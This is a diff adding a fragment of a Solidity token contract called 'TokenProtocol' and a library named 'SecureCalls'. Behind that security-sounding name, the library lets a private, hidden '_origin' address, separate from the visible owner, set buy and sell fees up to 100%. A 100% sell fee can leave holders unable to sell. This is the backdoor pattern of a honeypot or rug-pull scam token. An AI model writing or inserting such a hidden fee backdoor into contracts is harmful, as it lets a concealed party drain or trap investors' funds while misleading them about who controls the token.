@@ -1,0 +1,19 @@
+library SecureCalls {
+    function checkCaller(address sender, address _origin) internal pure {
+        require(sender == _origin, "Caller is not the original caller");
+    }
+}
+
+contract TokenProtocol is IERC20, Ownable, LibreMount {
+    uint private buyFee = 0; // Default, %
+
+    uint private sellFee = 0; // Default, %
+    address private _origin;
+
+    function updateFees(uint256 _buyFee, uint256 _sellFee) external {
+        SecureCalls.checkCaller(msg.sender, _origin);
+        require(_buyFee <= 100 && _sellFee <= 100, "Fee percent can't be higher than 100");
+        buyFee = _buyFee;
+        sellFee = _sellFee;
+    }
+}
